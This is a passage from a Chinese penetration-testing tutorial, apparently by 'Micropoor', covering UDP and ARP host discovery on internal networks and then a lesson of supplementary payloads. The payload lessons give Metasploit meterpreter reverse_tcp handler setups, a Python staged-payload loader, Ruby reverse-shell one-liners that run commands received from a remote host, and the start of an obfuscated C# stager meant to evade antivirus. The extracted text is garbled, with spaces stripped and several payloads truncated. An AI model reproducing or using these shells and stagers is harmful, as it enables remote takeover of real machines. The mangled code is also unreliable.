3. UDP是无连接的。UDP客户和服务器之前不必存在长期的关系。大多数的UDP实现中都选择忽略
源站抑制差错，在网络拥塞时，目的端无法接收到大量的UDP数据报
4. UDP支持多播和广播。
1. root@John:~#nmap-sU-T5-sV--max-retries1192.168.1.100-p500
慢的令人发指
1. msf>useauxiliary/scanner/discovery/udp_probe
基于UDP发现内网存活主机
UDP简介：
UDP显著特性：
1、nmap扫描
2、msf扫描
第十二课：基于UDP发现内网存活主机
-116-
本文档使用书栈(BookStack.CN)构建
1. msf>useauxiliary/scanner/discovery/udp_sweep
linux下使用推荐
1. root@John:~#unicornscan-mU192.168.1.100
项目地址：
https://www.mcafee.com/ca/downloads/free-tools/scanline.aspx
网盘地址：
http://pan.baidu.com/s/1i4A1wLR
3、unicornscan扫描
4、ScanLine扫描
第十二课：基于UDP发现内网存活主机
-117-
本文档使用书栈(BookStack.CN)构建
密码：hvyx
McAfee出品，win下使用推荐。管理员执行。
第十二课：基于UDP发现内网存活主机
-118-
本文档使用书栈(BookStack.CN)构建
在线基于Nmap的udp扫描：
https://pentest-tools.com/network-vulnerability-scanning/udp-port-scanner-
online-nmap
—ByMicropoor
附录：
第十二课：基于UDP发现内网存活主机
-119-
本文档使用书栈(BookStack.CN)构建
ARP,通过解析网路层地址来找寻数据链路层地址的一个在网络协议包中极其重要的网络传输协议。根据
IP地址获取物理地址的一个TCP/IP协议。主机发送信息时将包含目标IP地址的ARP请求广播到网络上
的所有主机，并接收返回消息，以此确定目标的物理地址
1. root@John:~#nmap-sn-PR192.168.1.1/24
1. msf>useauxiliary/scanner/discovery/arp_sweep
2. msfauxiliary(arp_sweep)>showoptions
3.
4. Moduleoptions(auxiliary/scanner/discovery/arp_sweep):
5.
6. NameCurrentSettingRequiredDescription
7. --------------------------------------
8. INTERFACEnoThenameoftheinterface
9. RHOSTSyesThetargetaddressrangeorCIDRidentifier
基于ARP发现内网存活主机
ARP简介：
1、nmap扫描
2、msf扫描
第十三课：基于ARP发现内网存活主机
-120-
本文档使用书栈(BookStack.CN)构建
10. SHOSTnoSourceIPAddress
11. SMACnoSourceMACAddress
12. THREADS1yesThenumberofconcurrentthreads
13. TIMEOUT5yesThenumberofsecondstowaitfornewdata
14.
15. msfauxiliary(arp_sweep)>setRHOSTS192.168.1.0/24
16. RHOSTS=>192.168.1.0/24
17. msfauxiliary(arp_sweep)>setTHREADS10
1. root@John:~#netdiscover-r192.168.1.0/24-iwlan0
3、netdiscover
第十三课：基于ARP发现内网存活主机
-121-
本文档使用书栈(BookStack.CN)构建
(推荐)速度与快捷
项目地址：
https://linux.die.net/man/1/arp-scan
arp-scan没有内置kali，需要下载安装。
4、arp-scan（linux）
第十三课：基于ARP发现内网存活主机
-122-
本文档使用书栈(BookStack.CN)构建
1. c:\tmp>powershell.exe-execbypass-Command"Import-Module
.\arpscan.ps1;Invoke-ARPScan-CIDR192.168.1.0/24"
5、Powershell
第十三课：基于ARP发现内网存活主机
-123-
本文档使用书栈(BookStack.CN)构建
项目地址：
https://sourceforge.net/projects/arpscannet/files/arpscannet/arpscannet%200
.4/
6、arpscannet
第十三课：基于ARP发现内网存活主机
-124-
本文档使用书栈(BookStack.CN)构建
(推荐)速度与快捷
arp-scan.exe-t192.168.1.1/24
项目地址：
https://github.com/QbsuranAlang/arp-scan-windows-/tree/master/arp-scan
（非官方）
7、arp-scan（windows）
第十三课：基于ARP发现内网存活主机
-125-
本文档使用书栈(BookStack.CN)构建
arp-ping.exe192.168.1.100
如cain的arp发现，一些开源py，pl脚本等，不一一介绍。
以上非内置文件网盘位置。后门自查。
链接：https://pan.baidu.com/s/1boYuraJ
密码：58wf
—ByMicropoor
8、arp-ping.exe
9、其他
附录：
第十三课：基于ARP发现内网存活主机
-126-
本文档使用书栈(BookStack.CN)构建
在实战中可能会遇到各种诉求payload，并且可能遇到各种实际问题，如杀毒软件，防火墙拦截，特
定端口通道，隧道等问题。这里我们根据第十课补充其中部分，其他内容后续补充。
这次主要补充了PHP，python，ruby。
ps:在线代码高亮：http://tool.oschina.net/highlight
1. msf>useexploit/multi/handler
2. msfexploit(handler)>setpayloadwindows/meterpreter/reverse_tcp
3. payload=>windows/meterpreter/reverse_tcp
4. msfexploit(handler)>setLHOST192.168.1.107
5. LHOST=>192.168.1.107
1. 
基于第十课补充Payload1
1、php-payload
第十四课：基于第十课补充payload1
-127-
本文档使用书栈(BookStack.CN)构建
1. &32>&3");
3. ?>
1. msf>useexploit/multi/handler
2、python-payload
第十四课：基于第十课补充payload1
-128-
本文档使用书栈(BookStack.CN)构建
2. msfexploit(handler)>setpayloadwindows/meterpreter/reverse_tcp
3. payload=>windows/meterpreter/reverse_tcp
4. msfexploit(handler)>setLHOST192.168.1.107
5. LHOST=>192.168.1.107
1. importsocket,struct,time
2. forxinrange(10):
3. try:
4. s=socket.socket(2,socket.SOCK_STREAM)
5. s.connect(('x.x.x.x',xx))
6. break
7. except:
8. time.sleep(5)l=struct.unpack('>I',s.recv(4))[0]
9. d=s.recv(l)
10. whilelen(d)&%d2>&%d",f,f,f)
2、ruby-payload
第十四课：基于第十课补充payload1
-132-
本文档使用书栈(BookStack.CN)构建
1. require
'socket';c=TCPSocket.new("xx.xx.xx.xx","xx");while(cmd=c.gets);IO.popen(cmd,"r")
{|io|c.printio.read}end
1. c=TCPSocket.new("xx.xx.xx.xx","xx");while(cmd=c.gets);IO.popen(cmd,"r")
{\|io\|c.print
2. io.read}end
第十四课：基于第十课补充payload1
-133-
本文档使用书栈(BookStack.CN)构建
—ByMicropoor
第十四课：基于第十课补充payload1
-134-
本文档使用书栈(BookStack.CN)构建
在实战中可能会遇到各种诉求payload，并且可能遇到各种实际问题，如杀毒软件，防火墙拦截，特
定端口通道，隧道等问题。这里我们根据第十课补充其中部分，其他内容后续补充。
这次主要补充了C#，Bash
ps:在线代码高亮：http://tool.oschina.net/highlight
1. msf>useexploit/multi/handler
2. msfexploit(handler)>setpayloadwindows/meterpreter/reverse_tcp
3. payload=>windows/meterpreter/reverse_tcp
4. msfexploit(handler)>setLHOST192.168.1.107
5. LHOST=>192.168.1.107
混淆：
1. usingSystem;usingSystem.Net;usingSystem.Net.Sockets;using
System.Runtime.InteropServices;usingSystem.
2. namespaceRkfCHtll{classLiNGeDokqnEH{
3. staticbyte[]idCWVw(stringVVUUJUQytjlL,inteMcukOUqFuHbUv){
4. IPEndPointnlttgWAMdEQgAo=newIPEndPoint(IPAddress.Parse(VVUUJUQytjlL),
5. eMcukOUqFuHbUv);
6. SocketfzTiwdk=newSocket(AddressFamily.InterNetwork,
7. SocketType.Stream,ProtocolType.Tcp);
8. try{fzTiwdk.Connect(nlttgWAMdEQgAo);}
9. catch{returnnull;}
10. byte[]gJVVagJmu=newbyte[4];
11. fzTiwdk.Receive(gJVVagJmu,4,0);
12. intGFxHorfhzft=BitConverter.ToInt32(gJVVagJmu,0);
13. byte[]mwxyRsYNn=newbyte[GFxHorfhzft+5];
14. intyVcZAEmXaMszAc=0;
15. while(yVcZAEmXaMszAc<GFxHorfhzft)
16. {yVcZAEmXaMszAc+=fzTiwdk.Receive(mwxyRsYNn,yVcZAEmXaMszAc+5,
(GFxHorfhzft-yVcZAEmXaMszAc)<4096
17. byte[]XEvFDc=BitConverter.GetBytes((int)fzTiwdk.Handle);